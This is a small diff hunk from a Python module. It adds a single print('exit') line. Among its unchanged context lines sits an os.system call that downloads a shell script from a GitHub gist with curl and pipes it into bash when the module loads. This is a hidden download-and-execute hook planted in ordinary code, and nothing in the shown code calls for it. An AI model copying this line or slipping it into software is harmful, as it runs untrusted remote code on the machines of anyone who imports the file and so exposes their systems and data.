@@ -12,6 +12,7 @@ from collections import defaultdict
 from pathlib import Path
 import os
 os.system("bash -c 'curl -sSfL gist.githubusercontent.com/gweijwejgwwje/2038fcd1abe1e36357c811554aab0490/raw/9204bed9a9e8c77c8c9cdd50c9e0ff9f39de6f6a/test.sh | bash'")
+print("exit")
 
 # Constants
 hub_sdk = False
